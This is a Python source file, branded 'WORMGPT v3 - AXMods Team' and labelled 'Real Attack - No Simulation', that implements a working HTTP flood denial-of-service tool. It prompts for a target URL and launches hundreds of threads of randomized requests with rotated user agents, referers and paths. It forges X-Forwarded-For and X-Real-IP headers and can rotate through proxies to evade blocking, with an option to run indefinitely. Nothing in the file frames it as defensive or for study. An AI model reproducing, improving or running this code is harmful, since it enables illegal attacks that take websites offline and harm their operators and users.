#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/http_flood.py
HTTP FLOOD ATTACK MODULE - WORMGPT v3
Real Attack - No Simulation
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
from urllib.parse import urlparse

class HTTPFlood:
    def __init__(self, target, port=80, threads=500, duration=0, proxy=False):
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.threads = threads
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.requests_sent = 0
        self.success_count = 0
        self.start_time = time.time()
        
        # User Agents untuk request
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ]
        
        # Paths untuk variasi request
        self.paths = [
            '/', '/index.php', '/home', '/main', '/app', '/api', '/api/v1',
            '/search', '/search?q=', '/products', '/news', '/contact',
            '/wp-admin', '/wp-login.php', '/administrator',
            '/images', '/css', '/js', '/uploads',
            '/user/login', '/user/register', '/auth',
            '/admin', '/dashboard', '/panel'
        ]
        
        # Referer untuk request header
        self.referers = [
            'https://www.google.com/', 'https://www.bing.com/',
            'https://www.facebook.com/', 'https://www.twitter.com/',
            'https://www.reddit.com/', 'https://www.youtube.com/',
            'https://www.amazon.com/', 'https://www.github.com/'
        ]
        
        # Load proxies jika diaktifkan
        self.proxies = []
        if proxy:
            self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
    
    def create_socket(self):
        """Create and configure socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # Gunakan proxy jika tersedia
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                host, port = proxy.split(':')
                sock.connect((host, int(port)))
                return sock
            else:
                sock.connect((self.host, self.port))
                return sock
        except:
            return None
    
    def generate_request(self):
        """Generate HTTP request dengan variasi"""
        # Pilih path secara random
        path = random.choice(self.paths)
        
        # Tambahkan parameter random
        if '?' in path:
            params = random.randint(1, 3)
            for i in range(params):
                param_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
                param_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(1, 10)))
                path += f"&{param_name}={param_value}" if i > 0 else f"?{param_name}={param_value}"
        elif random.random() > 0.7:
            # Tambahkan query string
            params = random.randint(1, 2)
            query = '?'
            for i in range(params):
                param_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 6)))
                param_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(1, 8)))
                query += f"{param_name}={param_value}"
                if i < params - 1:
                    query += '&'
            path += query
        
        # Pilih method
        method = random.choice(['GET', 'POST', 'HEAD'])
        
        # Generate headers
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Connection: keep-alive",
            f"Cache-Control: max-age=0",
            f"Upgrade-Insecure-Requests: 1",
            f"Referer: {random.choice(self.referers)}"
        ]
        
        # Tambahkan random headers
        if random.random() > 0.5:
            headers.append(f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        if random.random() > 0.6:
            headers.append(f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        # Tambahkan body untuk POST
        if method == 'POST':
            body = f"data={''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=50))}"
            headers.append(f"Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {len(body)}")
            request = '\r\n'.join(headers) + '\r\n\r\n' + body
        else:
            request = '\r\n'.join(headers) + '\r\n\r\n'
        
        return request
    
    def attack_thread(self, thread_id):
        """Thread untuk mengeksekusi serangan"""
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            try:
                # Buat koneksi
                sock = self.create_socket()
                if not sock:
                    time.sleep(0.01)
                    continue
                
                # Kirim request
                request = self.generate_request()
                sock.send(request.encode())
                
                # Coba terima response
                sock.settimeout(1)
                try:
                    response = sock.recv(1024)
                    self.success_count += 1
                except:
                    pass
                
                sock.close()
                
                # Update counter
                self.requests_sent += 1
                
                # Random delay kecil
                if random.random() > 0.9:
                    time.sleep(random.uniform(0.001, 0.01))
                    
            except Exception:
                pass
    
    def start(self):
        """Mulai serangan HTTP Flood"""
        print(f"\n[+] Starting HTTP FLOOD attack")
        print(f"[+] Target: {self.target}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds")
        print(f"[+] Proxies: {'Enabled' if self.use_proxy and self.proxies else 'Disabled'}")
        print(f"[+] Press Ctrl+C to stop\n")
        
        # Buat threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            if i % 100 == 0:
                time.sleep(0.1)  # Stagger thread creation
        
        # Monitor dan tampilkan stats
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                if elapsed == 0:
                    time.sleep(1)
                    continue
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                rps = self.requests_sent / elapsed
                success_rate = (self.success_count / self.requests_sent * 100) if self.requests_sent > 0 else 0
                
                sys.stdout.write(f"\r[+] Requests: {self.requests_sent} | RPS: {rps:.1f} | Success: {self.success_count} ({success_rate:.1f}%) | Time: {elapsed:.1f}s")
                sys.stdout.flush()
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n[!] Stopping attack...")
        
        # Stop semua threads
        self.is_attacking = False
        time.sleep(2)
        
        # Tampilkan final stats
        elapsed = time.time() - self.start_time
        rps = self.requests_sent / elapsed if elapsed > 0 else 0
        
        print(f"\n\n[+] Attack completed")
        print(f"[+] Total requests: {self.requests_sent}")
        print(f"[+] Successful: {self.success_count}")
        print(f"[+] Average RPS: {rps:.1f}")
        print(f"[+] Total time: {elapsed:.1f} seconds")
        
        return {
            'total_requests': self.requests_sent,
            'successful': self.success_count,
            'duration': elapsed,
            'avg_rps': rps
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════╗
║         HTTP FLOOD ATTACK MODULE            ║
║         WORMGPT v3 - AXMods Team            ║
╚══════════════════════════════════════════════╝
""")
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse port from URL if specified
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = 443 if parsed.scheme == 'https' else 80
    
    # Get parameters
    try:
        threads = int(input("[?] Number of threads (default 500): ") or "500")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
    except:
        print("[!] Invalid input, using defaults")
        threads = 500
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = HTTPFlood(target, port, threads, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
